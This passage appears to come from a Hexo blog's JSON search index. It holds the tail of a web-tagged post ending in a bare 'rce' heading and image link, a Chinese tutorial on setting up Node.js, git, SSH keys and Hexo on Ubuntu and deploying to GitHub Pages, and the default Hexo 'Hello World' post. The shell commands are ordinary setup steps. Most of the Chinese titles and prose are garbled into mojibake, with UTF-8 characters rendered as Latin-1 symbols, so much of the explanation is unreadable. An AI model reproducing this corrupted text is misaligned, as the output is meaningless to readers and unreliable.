num\n\nprint(rv)\n```\n\n**rce**\n\n<img src=\"image-20221016233908068.png\">\n\n","tags":["web"]},{"title":"hexoéƒ¨ç½²åœ¨Github Pages","url":"/2022/11/26/hexoéƒ¨ç½²åœ¨Github Pages/","content":"\nè®°å½•ä¸‹ç”¨hexoæ­å»ºGithub Pagesçš„è¿‡ç¨‹\n\n## å‰è¨€\n\nä¹‹å‰ä¸€ç›´éƒ½æƒ³åœ¨æœåŠ¡å™¨ä¸Šæ­å»ºä¸€ä¸ª**hexo**åšå®¢ï¼Œä½†å¯¹**node.js**å®Œå…¨ä¸ç†Ÿæ‚‰ä»¥åŠåœ¨å®å¡”é¢æ¿ä¸Šéƒ¨ç½²é™æ€åšå®¢å¥½åƒæœ‰ç‚¹éº»çƒ¦ï¼Œå°±ç®€å•çš„ç”¨**typecho**ï¼Œéšä¾¿æ‰¾äº†ä¸€ä¸ªä¸»é¢˜æ­å»ºäº†[åšå®¢](https://xlccccc.cn/)ã€‚\n\n**typecho**æ˜¯é€‚é…markdownçš„ï¼Œå°±æ˜¯æ¯ä¸ªå›¾ç‰‡éƒ½è¦ä¸Šä¼ é™„ä»¶ç„¶åæ›´æ”¹å›¾ç‰‡è·¯å¾„å¯¼è‡´æˆ‘è‡ªå·±å†™çš„mdå®Œå…¨æ²¡æœ‰å‘ä¸Šå»çš„æ¬²æœ›\n\nè€Œ**git+hexo**å°±å¾ˆæ–¹ä¾¿äº†ï¼Œå†™å®Œç›´æ¥`git push`å°±å¥½äº†ï¼Œç»„ä¼šä¹Ÿæ­£å¥½æœ‰è¿™ä¸ªä»»åŠ¡ï¼Œå°±å€Ÿæ­¤æœºä¼šå®Œæˆäº†ã€‚(~~ä¸èƒ½å†æ‹–äº†~~)\n\n## ç¯å¢ƒ\n\nUbuntu 22.04\n\n## node.js and npm\n\nNodeçš„ç¯å¢ƒé…ç½®æ¯”è¾ƒç®€å•\n\n```bash\n$ sudo apt install nodejs npm\n$ node -v\nv12.22.9\n$ npm -v\nv8.5.1\n```\n\nå®‰è£…çš„æ˜¯é•¿æœŸç‰ˆæœ¬ï¼Œæ­å»º**hexo**å·²ç»å¤Ÿç”¨äº†\n\n## git\n\n```bash\n$ sudo apt-get install git-core\n```\n\n### é€šè¿‡sshæ–¹å¼é“¾æ¥githubè´¦æˆ·\n\n```bash\n$ git config --global user.email \"example@xx.com\"\n$ git config --global user.name \"xxx\"\n#æœ¬åœ°ç”Ÿæˆå¯†é’¥\n$ ssh-keygen -b 4096 -t rsa -C \"example@xx.com\"\n#ç”Ÿæˆåå°†è¯¥å¯†é’¥åŠ å…¥åˆ°ä½ çš„sshä¸­\n$ ssh-add ~/.ssh/id_rsa\n```\n\nç„¶åæ‰“å¼€**github**\n\nè¿›å…¥**setting**é€‰æ‹©**SSH and GPG keys**ï¼Œç‚¹å‡»**New SSH key**\n\nå–ä¸€ä¸ªåˆé€‚çš„åå­—ï¼Œå¹¶å°†ç”Ÿæˆçš„**id_rsa.pub**ä¸­çš„å†…å®¹å¤åˆ¶åˆ°keyä¸­\n\n```bash\n#ä»¥sshæ–¹å¼cloneåˆ›å»ºå¥½çš„github pagesåº“\n$ git clone git@github.com:xlccccc/xlccccc.github.io.git\n```\n\næ­¤æ—¶èƒ½æ­£å¸¸`git push`å°±æ˜¯æˆåŠŸé“¾æ¥äº†\n\n(è®°å¾—æ‰“å¼€Pagesï¼Œä»¥åŠgithubå­¦ç”ŸåŒ…å¯ä»¥ç™½å«–ä¸€ä¸ª**.me**åç¼€åŸŸå)\n\n## hexo\n\n### æœ¬åœ°\n\n```bash\n#åªæœ‰rootæƒé™æ‰å®‰è£…æˆåŠŸäº†ï¼ŒåŸå› æœªçŸ¥\n$ sudo npm install -g hexo-cli\n$ hexo init blog\n$ cd blog\n$ npm install\n#é‡æ–°ç”Ÿæˆé™æ€åšå®¢çš„æ‰€æœ‰å†…å®¹\n$ hexo generate\n#é‡å¯ hexo æœ¬åœ°æœåŠ¡\n$ hexo server\n#å®‰è£…gitæ’ä»¶\n$ npm install hexo-deployer-git --save\n```\n\næ­¤æ—¶è®¿é—® https://localhost:4000 å¯ä»¥çœ‹åˆ°æœ¬åœ°åšå®¢é¡µé¢\n\n### github pages\n\nåœ¨**_config.yml**çš„æœ€åä¸€è¡Œæ·»åŠ \n\n```yaml\ndeploy:\n  type: git\n  repository: git@github.com:xlccccc/xlccccc.github.io.git\n  branch: master\n```\n\næ›´æ”¹urlä¸ºä½ çš„`github pages`\n\n```bash\n$ hexo clean\n$ hexo generate\n$ hexo deploy\n```\n\næ­¤æ—¶è®¿é—® https://xlccccc.github.io å°±å¯çœ‹åˆ°åšå®¢å•¦\n\n```bash\n$ hexo new photo \"My Gallery\"\n$ hexo generate\n$ hexo deploy\n```\n\nå¦‚æœæ”¹äº†åŸŸåï¼Œåœ¨sourceä¸‹æ–°å»ºCNAMEï¼Œå†…å®¹ä¸ºä½ çš„åŸŸå(å¦‚`xlccccc.me`)ï¼Œç„¶å`hexo generate` `hexo deploy`å³å¯\n\n","tags":["dev"]},{"title":"Hello World","url":"/2022/11/26/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]